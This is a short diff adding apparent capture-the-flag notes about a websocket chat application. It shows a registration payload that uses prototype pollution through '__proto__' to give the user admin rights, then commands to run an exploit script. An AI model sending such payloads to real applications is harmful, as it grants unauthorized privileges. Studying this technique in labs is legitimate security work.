@@ -1,0 +1,39 @@
+[admin] LePireBot: Message restricted to administrators.
+
+
+websocket packet
+{
+	"user":{"nickname":"LePireBot","color":"#ECA400","admin":true},
+	"messageRestricted":true
+}
+
+Normally, Registration is like
+```
+{
+	"nickname": "l3o",
+	"color": "#1337FF"
+}
+```
+We want it to be 
+```
+{
+	"nickname": "l3o",
+	"color": "#1337FF",
+	"admin": true
+}
+```
+
+
+Prototype Pollution
+```
+{
+    "nickname": "l3o",
+    "color": "#1337ff",
+    "__proto__": {
+        "admin": true
+    }
+}
+```
+
+npm install ws
+node exp.js
